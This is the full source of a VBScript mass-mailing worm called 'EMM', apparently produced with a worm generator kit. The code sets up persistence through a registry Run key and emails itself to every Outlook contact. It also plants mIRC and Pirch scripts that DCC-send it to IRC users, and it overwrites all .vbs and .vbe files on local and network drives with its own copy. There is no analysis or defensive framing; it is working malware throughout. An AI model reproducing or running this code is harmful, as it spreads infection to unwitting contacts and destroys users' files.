   'This file Has been created whit Vbs Worms Generator 0.91
   'EMM Created By PetiK
   On Error Resume Next
   Set tgsyfwexzmg = CreateObject("WScript.Shell")
   Set bztdyubgxga= Createobject("scripting.filesystemobject")
   tgsyfwexzmg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\emm","wscript.exe "&bztdyubgxga.GetSpecialFolder(1)& "\emm.vbs %"
   bztdyubgxga.copyfile wscript.scriptfullname,bztdyubgxga.GetSpecialFolder(1)& "\emm.vbs"
   if tgsyfwexzmg.regread ("HKCU\software\EMM\mailed") <> "1" then
   henlxiuxvbc()
   end if
   if tgsyfwexzmg.regread ("HKCU\software\EMM\mirqued") <> "1" then
   kvvafcrzisc ""
   end if
   if tgsyfwexzmg.regread ("HKCU\software\EMM\pirched") <> "1" then
   zukoooqjfjy ""
   end if
   eemoplyfcul()
   mwkntzjqjdq()
   Function henlxiuxvbc()
   On Error Resume Next
   Set bbpgohjwjpm = CreateObject("Outlook.Application")
   If bbpgohjwjpm= "Outlook"Then
   Set vufqcywclsd=bbpgohjwjpm.GetNameSpace("MAPI")
   For Each xbnlzarbdhc In vufqcywclsd.AddressLists
   If xbnlzarbdhc.AddressEntries.Count <> 0 Then
   uwytgnkctue = xbnlzarbdhc.AddressEntries.Count
   For swxwyknrgnm= 1 To uwytgnkctue
   Set svcaryllydj = xbnlzarbdhc.AddressEntries(swxwyknrgnm)
   Set xhxjsesxudv = bbpgohjwjpm.CreateItem(0)
   xhxjsesxudv.To = svcaryllydj.Address
   xhxjsesxudv.Subject = "Here you have, ;o)"
   xhxjsesxudv.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
   xhxjsesxudv.Attachments.Add bztdyubgxga.GetSpecialFolder(1)& "\emm.vbs"
   xhxjsesxudv.DeleteAfterSubmit = True
   If xhxjsesxudv.To <> "" Then
   xhxjsesxudv.Send
   tgsyfwexzmg.regwrite "HKCU\software\EMM\mailed", "1"
   End If
   Next
   End If
   Next
   end if
   End Function
   Function kvvafcrzisc(gyehfktaefk)
   On Error Resume Next
   if gyehfktaefk = "" then
   if bztdyubgxga.fileexists("c:\mirc\mirc.ini") then gyehfktaefk="c:\mirc"
   if bztdyubgxga.fileexists("c:\mirc32\mirc.ini") then gyehfktaefk="c:\mirc32"
   vtiizcmqkay=tgsyfwexzmg.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   if bztdyubgxga.fileexists(vtiizcmqkay & "\mirc\mirc.ini") then gyehfktaefk=vtiizcmqkay & "\mirc"
   end if
   if gyehfktaefk <> "" then
   set yxaswzhvudx = bztdyubgxga.CreateTextFile(gyehfktaefk & "\script.ini", True)
   yxaswzhvudx.WriteLine "[script]"
   yxaswzhvudx.writeline "n0=on 1:JOIN:#:{"
   yxaswzhvudx.writeline "n1=  /if ( $nick == $me ) { halt }"
   yxaswzhvudx.writeline "n2=  /.dcc send $nick "&bztdyubgxga.GetSpecialFolder(1)& "\emm.vbs"
   yxaswzhvudx.writeline "n3=}"
   yxaswzhvudx.close
   tgsyfwexzmg.regwrite "HKCU\software\EMM\Mirqued", "1"
   end if
   end function
   function zukoooqjfjy(zvhwlkbvgbw)
   On Error Resume Next
   if zvhwlkbvgbw="" then
   if bztdyubgxga.fileexists("c:\pirch\Pirch32.exe") then zvhwlkbvgbw="c:\pirch"
   if bztdyubgxga.fileexists("c:\pirch32\Pirch32.exe") then zvhwlkbvgbw="c:\pirch32"
   diaztthlrfp=tgsyfwexzmg.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
   if bztdyubgxga.fileexists(diaztthlrfp & "\pirch\Pirch32.exe") then zvhwlkbvgbw=diaztthlrfp & "\pirch\Pirch32.exe"
   end if
   if zvhwlkbvgbw <> "" then
   set fragazwfdpg= bztdyubgxga.CreateTextFile(zvhwlkbvgbw & "\events.ini", True)
   fragazwfdpg.WriteLine "[Levels]"
   fragazwfdpg.WriteLine "Enabled=1"
   fragazwfdpg.WriteLine "Count=6"
   fragazwfdpg.WriteLine "Level1=000-Unknowns"
   fragazwfdpg.WriteLine "000-UnknownsEnabled=1"
   fragazwfdpg.WriteLine "Level2=100-Level 100"
   fragazwfdpg.WriteLine "100-Level 100Enabled=1"
   fragazwfdpg.WriteLine "Level3=200-Level 200"
   fragazwfdpg.WriteLine "200-Level 200Enabled=1"
   fragazwfdpg.WriteLine "Level4=300-Level 300"
   fragazwfdpg.WriteLine " 300-Level 300Enabled=1"
   fragazwfdpg.WriteLine "Level5=400-Level 400 "
   fragazwfdpg.WriteLine "400-Level 400Enabled=1"
   fragazwfdpg.WriteLine "Level6=500-Level 500"
   fragazwfdpg.WriteLine "500-Level 500Enabled=1"
   fragazwfdpg.WriteLine ""
   fragazwfdpg.WriteLine "[000-Unknowns]"
   fragazwfdpg.WriteLine "UserCount=0"
   fragazwfdpg.WriteLine "EventCount=0"
   fragazwfdpg.WriteLine ""
   fragazwfdpg.WriteLine "[100-Level 100]"
   fragazwfdpg.WriteLine "User1=*!*@*"
   fragazwfdpg.WriteLine "UserCount=1"
   fragazwfdpg.writeline "Event1=ON JOIN:#:/dcc tsend $nick " & bztdyubgxga.GetSpecialFolder(1) & "\emm.vbs"
   fragazwfdpg.WriteLine "EventCount=1"
   fragazwfdpg.WriteLine ""
   fragazwfdpg.WriteLine "[200-Level 200]"
   fragazwfdpg.WriteLine "UserCount=0"
   fragazwfdpg.WriteLine "EventCount=0"
   fragazwfdpg.WriteLine ""
   fragazwfdpg.WriteLine "[300-Level 300]"
   fragazwfdpg.WriteLine "UserCount=0"
   fragazwfdpg.WriteLine "EventCount=0"
   fragazwfdpg.WriteLine ""
   fragazwfdpg.WriteLine "[400-Level 400]"
   fragazwfdpg.WriteLine "UserCount=0"
   fragazwfdpg.WriteLine "EventCount=0"
   fragazwfdpg.WriteLine ""
   fragazwfdpg.WriteLine "[500-Level 500]"
   fragazwfdpg.WriteLine "UserCount=0"
   fragazwfdpg.WriteLine "EventCount=0"
   fragazwfdpg.close
   tgsyfwexzmg.regwrite "HKCU\software\EMM\pirched", "1"
   end if
   end function
   if month(now) =1 and day(now) =26 then
   tgsyfwexzmg.run "Http://www.virii.com.ar",3,false
   end if
   Function mwkntzjqjdq()
   On Error Resume Next
   Set mpntbcmnseu = bztdyubgxga.Drives
   For Each jrhkuytiggf In mpntbcmnseu
   If jrhkuytiggf.Drivetype = Remote Then
   iaxbqdweghd= jrhkuytiggf & "\"
   Call petljdojelq(iaxbqdweghd)
   ElseIf jrhkuytiggf.IsReady Then
   iaxbqdweghd= jrhkuytiggf&"\"
   Call petljdojelq(iaxbqdweghd)
   End If
   Next
   End Function
   Function petljdojelq(iibuitzhxgz)
   Set boihenlxiux= bztdyubgxga.GetFolder(iibuitzhxgz)
   Set vbckvvafcrz= boihenlxiux.Files
   For Each isczukoooqj In vbckvvafcrz
   if bztdyubgxga.GetExtensionName(isczukoooqj.path) = "vbs" then
   bztdyubgxga.copyfile wscript.scriptfullname , isczukoooqj.path , true
   end if
   if bztdyubgxga.GetExtensionName(isczukoooqj.path) = "vbe" then
   bztdyubgxga.copyfile wscript.scriptfullname , isczukoooqj.path , true
   end if
   if isczukoooqj.name = "mirc.ini" then
   kvvafcrzisc(isczukoooqj.ParentFolder)
   end if
   if isczukoooqj.name = "Pirch32.exe" then
   zukoooqjfjy(isczukoooqj.ParentFolder)
   end if
   Next
   Set isczukoooqj= boihenlxiux.SubFolders
   For Each fjyeemoplyf In isczukoooqj
   Call petljdojelq(fjyeemoplyf.path)
   Next
   End Function
